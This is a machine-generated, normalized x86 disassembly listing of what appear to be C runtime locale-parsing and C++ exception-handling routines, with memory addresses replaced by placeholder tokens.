call sub_1001482a
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100148d2
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10017c1c
mov esi [ eax + 0x6c ]
mov eax esi
call sub_100189c9
retn
push 0x20
call sub_10013ae8
pop ecx
sub_100148de
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_10014931
push 0x8
push r--data
call sub_10018984
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100189c9
retn
push 0xd
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100149de
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10011c31
pop ecx
push 0xc
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1001476b
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100149ea
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10011c31
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_10014593
pop ecx
sub_100149f3
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e2fb
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_10014a33
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_10011a90
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_10011be0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1001e36f
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1001e36f
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_10011be0
test eax eax
sub_10014b5c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100178e5
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100149f3
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100149f3
add esp 0x14
sub_10014bc9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_100166a9
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_100149f3
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_100149f3
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_1001e2fb
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_10011c31
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10011c31
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10011c31
pop ecx
push [ esi + 0x54 ]
call sub_10011c31
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10011c31
pop ecx
sub_10014d46
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_10017c1c
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10010990
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_10014a33
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_100178e5
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_1001e9df
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_10014b5c
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_10017080
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_100178e5
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_10017080
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1001e36f
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_10014f77
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_10017c1c
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_10014d46
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10010990
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_100166a9
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_10017080
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_100178e5
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_10017080
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_10011c31
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_1001ed8a
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_10011c31
push [ ebx + 0x54 ]
call sub_10011c31
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10011cbf
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_10015279
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_10014bc9
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_10014f77
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_10014d46
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_10014f77
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_1001edcc
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10010990
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_10011be0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1001e36f
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_10014f77
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_1001ee90
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_10015494
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_100166ee
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_100166ee
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_100167f3
mov [ eax ] 0xc
push edi
push 0x220
call sub_100166ee
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10011c31
mov eax [ esi ]
mov ecx rw-data
call sub_10014804
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_10015279
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10011c31
push esi
call sub_10011c31
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_1001cd7c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_1001476b
push [ esi ]
call sub_10014593
push esi
call sub_10011c31
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10011c31
push [ esi ]
call sub_1001476b
push [ esi ]
call sub_10014593
push esi
call sub_10011c31
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10015589
push 0x14
push r--data
call sub_10018984
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_10017c1c
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_10014868
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_100166ee
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100156f4
mov eax [ ebp - 0x20 ]
push 0xc
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_10014804
mov [ ebp - 0x4 ] ebx
call sub_100156b7
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_10015279
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_100189c9
retn
push edi
call sub_1001476b
push edi
call sub_10014593
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_1001482a
push edi
call sub_1001476b
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100156c3
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_1001482a
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_10017080
add esp 0xc
call sub_100148de
sub_100156f9
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10010806
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015722
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100108d3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10015749
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10013730
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_100157a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_10017c1c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_10017c1c
add eax 0x90
dec [ eax ]
call sub_10017c1c
and [ eax + 0x90 ] 0x0
jmp sub_1001d34d
sub_100157f1
push 0x10
push r--data
call sub_10018984
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100158b7
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10017c1c
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_100189c9
retn
call sub_1001d399
call sub_1001d399
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_1001d680
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_100158d2
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10017c1c
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_10015917
push 0x8
push r--data
call sub_10018984
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_100189c9
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10013e5f
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001596c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_100159a8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_1001d399
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_10015749
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_10015a6c
push 0x2c
push r--data
call sub_10018984
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1001410e
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10017c1c
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10017c1c
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10017c1c
mov [ eax + 0x88 ] esi
call sub_10017c1c
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_100141b3
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
